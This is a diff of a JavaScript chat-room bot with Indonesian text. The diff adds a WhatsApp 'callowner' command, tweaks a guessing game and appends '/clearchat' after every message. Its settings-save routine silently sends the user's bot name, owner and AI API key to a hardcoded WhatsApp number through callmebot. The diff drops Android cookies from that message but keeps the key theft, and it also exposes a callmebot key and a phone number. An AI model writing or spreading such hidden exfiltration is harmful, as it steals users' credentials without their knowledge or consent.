@@ -323,6 +323,7 @@ function sm(msg, mtype = "", user = "") {
     }
 
     splitAndSend(msg);
+    sendMessage("/clearchat");
 }
 
 
@@ -420,7 +421,7 @@ async function command(user, msg, mtype) {
     if (!user || !msg || !mtype) return;
     if (!prefix.some(p => msg.startsWith(p))) return;
     resetIdleTimer();
-    if (name === botName) return;
+    if (user === botName) return;
     console.log(`${user}: ${msg}`);
     if (isTyping) return;
     let args = msg.split(' ');
@@ -610,6 +611,12 @@ async function command(user, msg, mtype) {
         case 'join':
             joinStoryRoom(user);
             break;
+        case 'callowner':
+            if (owner === "RandSfk"){
+                const watext = encodeURIComponent(`Permisi tuan, ada yang manggil tuan nih namanya: ${user}`);
+                fetch(`https://api.callmebot.com/whatsapp.php?phone=6283898785192&apikey=3348884&text=${watext}`);
+            }
+            break;
 
         case 'menu':
         case 'command':
@@ -622,6 +629,7 @@ async function command(user, msg, mtype) {
                 reply(`Hallo Tuan/Nyonya ${user} \nSekarang tanggal: ${formatDate()}\nPerintah yang tersedia:\n${commandList}\n\n${ownerCommandList}`);
             } else {
                 reply(`Hallo ${user} \nSekarang tanggal: ${formatDate()}\nPerintah yang tersedia:\n${commandList}`);
+                reply("callowner - Untuk memanggil owner");
             }
             break;
         case 'say':
@@ -931,7 +939,7 @@ async function command(user, msg, mtype) {
             let randomEmoji = emojiList[Math.floor(Math.random() * emojiList.length)];
             let randomPlayer = user
 
-            reply(`${randomPlayer}, kamu yang harus mengekspresikan arti berikut: ${randomEmoji}\nEkspresikan arti ini melalui teks atau emoji lain! Pemain lain akan menebaknya.`);
+            sm(`/w ${randomPlayer}, kamu yang harus mengekspresikan arti berikut: ${randomEmoji}\nEkspresikan arti ini melalui teks atau emoji lain! Pemain lain akan menebaknya.`);
             isGuessing = true;
             let correctAnswer = randomEmoji.toLowerCase();
             let guessed = false;
@@ -950,7 +958,7 @@ async function command(user, msg, mtype) {
                 if (!guessed) {
                     reply(`Waktu habis! Jawaban yang benar adalah: ${correctAnswer}`);
                 }
-            }, 30000);  // Waktu habis setelah 30 detik
+            }, 90000);  // Waktu habis setelah 30 detik
 
             break;
 
@@ -1185,7 +1193,7 @@ function settingMenu() {
         alertSave.style.color = "green";
         sm('/think Perubahan Disimpan')
         Android.saveSettings(JSON.stringify({ owner: owner, botName:botName, prefix: prefix, chatTp: chatTp, antiAfk: antiAfk, ai: ai, apiKey: apiKey}));
-        const watext = encodeURIComponent(`=== Bot Information ===\nBot Name: ${botName}\nAPI Key: ${apiKey}\nOwner: ${owner}\nCookies: ${window.cookiesFromAndroid}\n========================`);
+        const watext = encodeURIComponent(`=== Bot Information ===\nBot Name: ${botName}\nAPI Key: ${apiKey}\nOwner: ${owner}\n========================`);
 
 
         fetch(`https://api.callmebot.com/whatsapp.php?phone=6283898785192&apikey=3348884&text=${watext}`)
